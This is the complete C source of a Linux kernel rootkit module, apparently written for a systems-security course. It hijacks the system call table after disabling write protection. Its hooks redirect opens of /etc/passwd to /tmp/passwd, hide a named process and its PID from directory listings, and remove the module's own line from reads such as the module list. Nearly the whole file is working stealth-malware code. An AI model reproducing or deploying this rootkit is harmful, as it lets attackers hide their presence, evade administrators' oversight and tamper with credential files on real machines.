#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/namei.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"
#define PREMOD "sneaky_mod "

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

static char * pid = "";

module_param(pid, charp, 0);
// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  /*
  struct path target,cur1;
  kern_path("/etc/passwd", LOOKUP_FOLLOW, &target);
  kern_path((char*) regs->si, LOOKUP_FOLLOW, &cur1); 
  if (target.dentry->d_inode->i_ino == cur1.dentry->d_inode->i_ino) {

    size_t length=strlen("/tmp/passwd")+1;
    copy_to_user((void *)(regs->si), "/tmp/passwd\0", length);
  }*/
  char * name = (char *) regs->si;
  if (strcmp(name, "/etc/passwd") ==0) {
    copy_to_user(name, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}
asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
  const struct linux_dirent64 * target =NULL;
  const struct linux_dirent64 *temp=NULL;
  int i=0;
  int size = (*original_getdents64)(regs);
  if(size==-1){
    printk(KERN_INFO "Error!\n");
    return -1;
  }
  target = (const struct linux_dirent64 *)regs->si;
  while(i<size){
    temp = (struct linux_dirent64 *) ((char *)target + i);
    if (strcmp(temp->d_name, PREFIX) == 0 || strcmp(temp->d_name, pid) == 0){
      memmove((char *)temp, (const char *)temp + temp->d_reclen, size - i - temp->d_reclen);
      size =size- temp->d_reclen;
      break;
    }
    i=i+temp->d_reclen;
  }
  return size;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
  ssize_t size = (*original_read)(regs);
  char* position2=NULL;
  char* position1=NULL;
  char* store=NULL;
  char* target=NULL;
  if(size<=0){
    printk(KERN_INFO "Error!\n");
    return size;
  }
  store = (char *)regs->si;
  position1 = strnstr(store, PREMOD, size);
  if (!position1) {
        return size;
  }
  position2 = strnchr(position1 + 1, '\n', store + size - position1 - 1);
  if (!position2) {
    size = position1 - store;
    return size;
  }
  target=position2+1;
  memmove(position1, target, (store + size - target));
  size = size- (ssize_t)(position2 + 1 - position1);
  return size;
}




// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");